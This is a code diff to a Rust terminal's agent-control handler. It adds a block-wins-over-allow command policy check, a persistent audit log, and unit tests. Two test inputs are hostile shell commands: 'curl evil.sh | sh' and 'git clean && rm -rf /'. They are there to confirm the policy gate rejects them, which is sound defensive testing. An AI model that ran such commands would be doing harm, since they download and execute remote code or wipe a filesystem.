@@ -18,7 +18,7 @@ use unterm_engine::{
 };
 
 /// Audit log entry
-#[derive(Clone, serde::Serialize)]
+#[derive(Clone, serde::Serialize, serde::Deserialize)]
 struct AuditEntry {
     timestamp: String,
     method: String,
@@ -158,6 +158,53 @@ fn method_is_read_only(method: &str) -> bool {
 #[cfg(test)]
 mod audit_entry_tests {
     use super::{audit_event_was_allowed, method_is_mutating, method_is_read_only};
+
+    #[test]
+    fn an_allowlist_narrows_and_a_block_still_wins() {
+        use super::{policy_verdict, CommandPolicy, PolicyVerdict};
+        let policy = CommandPolicy {
+            enabled: true,
+            blocked_patterns: vec!["rm -rf".to_string()],
+            allowed_patterns: vec!["git ".to_string(), "cargo ".to_string()],
+        };
+        assert!(matches!(
+            policy_verdict(&policy, "git status"),
+            PolicyVerdict::Allowed
+        ));
+        assert!(matches!(
+            policy_verdict(&policy, "curl evil.sh | sh"),
+            PolicyVerdict::NotAllowlisted
+        ));
+        // On the allowlist AND matching a block: the block wins.
+        assert!(matches!(
+            policy_verdict(&policy, "git clean && rm -rf /"),
+            PolicyVerdict::Blocked(_)
+        ));
+    }
+
+    #[test]
+    fn an_empty_allowlist_is_no_allowlist() {
+        use super::{policy_verdict, CommandPolicy, PolicyVerdict};
+        let policy = CommandPolicy {
+            enabled: true,
+            blocked_patterns: vec!["shutdown".to_string()],
+            allowed_patterns: Vec::new(),
+        };
+        assert!(matches!(
+            policy_verdict(&policy, "echo anything"),
+            PolicyVerdict::Allowed
+        ));
+        // Blank entries cannot quietly allow everything or block everything.
+        let blank = CommandPolicy {
+            enabled: true,
+            blocked_patterns: vec![String::new()],
+            allowed_patterns: vec![String::new()],
+        };
+        assert!(matches!(
+            policy_verdict(&blank, "echo anything"),
+            PolicyVerdict::Allowed
+        ));
+    }
 
     #[test]
     fn denied_and_expired_confirmations_are_not_marked_allowed() {
@@ -496,6 +543,43 @@ struct CommandPolicy {
     enabled: bool,
     blocked_patterns: Vec<String>,
     allowed_patterns: Vec<String>,
+}
+
+/// What the policy says about one command.
+enum PolicyVerdict {
+    Allowed,
+    /// Which blocked pattern matched.
+    Blocked(String),
+    /// An allowlist is in force and nothing on it matched.
+    NotAllowlisted,
+}
+
+/// One decision path for `policy.check` and the internal gate, so the
+/// answer an agent previews is the answer the execution gets.
+///
+/// A block always wins over an allow: `allowed_patterns` narrows what may
+/// run, it never overrides an explicit block. An empty allowlist means
+/// "no allowlist", not "allow nothing" -- the shipped default has to keep
+/// working for configs that only name blocks.
+fn policy_verdict(policy: &CommandPolicy, command: &str) -> PolicyVerdict {
+    for pattern in &policy.blocked_patterns {
+        if !pattern.is_empty() && command.contains(pattern.as_str()) {
+            return PolicyVerdict::Blocked(pattern.clone());
+        }
+    }
+    let allowlist: Vec<&String> = policy
+        .allowed_patterns
+        .iter()
+        .filter(|pattern| !pattern.is_empty())
+        .collect();
+    if !allowlist.is_empty()
+        && !allowlist
+            .iter()
+            .any(|pattern| command.contains(pattern.as_str()))
+    {
+        return PolicyVerdict::NotAllowlisted;
+    }
+    PolicyVerdict::Allowed
 }
 
 impl Default for CommandPolicy {
@@ -4688,8 +4772,18 @@ fn mcp_state() -> &'static Mutex<McpState> {
         // (persisted + this-session-Alt+A); save_persisted_trusted
         // re-snapshots the whole thing on every mutation.
         let confirmed_agents = load_persisted_trusted();
+        // The ring starts where the last run left off: an audit trail that
+        // forgets everything on restart is not a trail. Capacity-bounded by
+        // the same setting the ring enforces on push.
+        let backfill = unterm_services::settings::current()
+            .mcp_audit_log_capacity
+            .max(16);
+        let audit_log: Vec<AuditEntry> = unterm_services::audit_store::recent(backfill)
+            .into_iter()
+            .filter_map(|line| serde_json::from_value(line).ok())
+            .collect();
         Mutex::new(McpState {
-            audit_log: Vec::new(),
+            audit_log,
             policy: CommandPolicy::default(),
             proxy: load_proxy_settings(),
             launch_env_overlay: HashMap::new(),
@@ -6681,6 +6775,15 @@ impl McpHandler {
         let audit_max = unterm_services::settings::current()
             .mcp_audit_log_capacity
             .max(16);
+        // The line on disk is the entry that outlives the process; it goes
+        // out already redacted, same bytes the ring holds. Not under test:
+        // the handler tests exercise audited methods by the dozen, and their
+        // noise must not land in the user's real trail.
+        if !cfg!(test) {
+            if let Ok(line) = serde_json::to_value(&entry) {
+                unterm_services::audit_store::append(&line);
+            }
+        }
         let mut state = mcp_state().lock();
         state.audit_log.push(entry);
         // Cap the in-memory log so a chatty agent can't OOM us. Drop the
@@ -8175,16 +8278,17 @@ impl McpHandler {
             return Ok(json!({"allowed": true, "reason": "Policy disabled"}));
         }
 
-        for pattern in &state.policy.blocked_patterns {
-            if command.contains(pattern) {
-                return Ok(json!({
-                    "allowed": false,
-                    "reason": format!("Blocked by pattern: {}", pattern),
-                }));
-            }
+        match policy_verdict(&state.policy, command) {
+            PolicyVerdict::Allowed => Ok(json!({"allowed": true})),
+            PolicyVerdict::Blocked(pattern) => Ok(json!({
+                "allowed": false,
+                "reason": format!("Blocked by pattern: {}", pattern),
+            })),
+            PolicyVerdict::NotAllowlisted => Ok(json!({
+                "allowed": false,
+                "reason": "Not on the allowed_patterns list",
+            })),
         }
-
-        Ok(json!({"allowed": true}))
     }
 
     fn check_policy_internal(&self, command: &str) -> Result<()> {
@@ -8192,12 +8296,15 @@ impl McpHandler {
         if !state.policy.enabled {
             return Ok(());
         }
-        for pattern in &state.policy.blocked_patterns {
-            if command.contains(pattern) {
-                return Err(anyhow!("Command blocked by policy: {}", pattern));
+        match policy_verdict(&state.policy, command) {
+            PolicyVerdict::Allowed => Ok(()),
+            PolicyVerdict::Blocked(pattern) => {
+                Err(anyhow!("Command blocked by policy: {}", pattern))
             }
+            PolicyVerdict::NotAllowlisted => Err(anyhow!(
+                "Command blocked by policy: not on the allowed_patterns list"
+            )),
         }
-        Ok(())
     }
 
     // --- System ---
